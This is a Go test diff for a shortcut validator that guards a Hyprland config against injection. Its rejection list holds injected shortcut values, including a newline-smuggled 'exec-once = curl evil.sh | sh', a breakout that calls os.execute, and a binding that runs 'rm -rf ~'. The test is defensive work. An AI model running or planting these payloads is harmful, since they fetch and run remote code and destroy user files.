@@ -19,3 +19,32 @@ func TestHyprLine(t *testing.T) {
 		t.Fatalf("remove: %q", got)
 	}
 }
+
+// A shortcut from the window goes into Hyprland's config: only key names
+// pass, never quotes, backslashes or line breaks that would add code.
+func TestValidAccel(t *testing.T) {
+	for _, ok := range []string{"Alt+Space", "Ctrl+Shift+`", "Super+K", "F5", "Ctrl+Alt+Ç", "Ctrl+.", "Ctrl+Shift+Up"} {
+		if !validAccel(ok) {
+			t.Errorf("%q refused", ok)
+		}
+	}
+	for _, bad := range []string{
+		"",
+		"Alt+Space\nexec-once = curl evil.sh | sh",
+		`Alt+X", "x", "sh -c 'curl evil|sh'") os.execute("id") --`,
+		"Alt+\\",
+		"Alt+'",
+		"Alt+,",
+		"Alt+#",
+		"Ctrl++",
+		"Alt+Space # Blup Studio\nbind = , A, exec, rm -rf ~",
+		strings.Repeat("A", 65),
+	} {
+		if validAccel(bad) {
+			t.Errorf("%q accepted", bad)
+		}
+	}
+	if err := writeBinding("Alt+X\nexec-once = id"); err == nil {
+		t.Error("writeBinding wrote an invalid shortcut")
+	}
+}
